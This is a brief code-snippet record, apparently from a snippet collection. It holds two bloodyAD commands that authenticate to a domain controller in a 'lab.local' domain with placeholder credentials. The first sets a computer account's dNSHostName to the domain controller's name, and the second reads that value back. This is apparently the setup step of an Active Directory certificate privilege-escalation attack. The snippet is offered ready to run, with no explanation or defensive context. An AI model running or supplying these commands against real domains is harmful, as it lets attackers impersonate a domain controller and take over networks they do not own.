---
id: 7aff147d-2555-439c-983a-78ac592afe26
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.137249+00:00'
updated_at: '2023-04-10T20:36:10.277684+00:00'
---

# Code Snippet 7aff147d

**Language**: ps1

```ps1
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '["DC.lab.local"]'
python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName
```
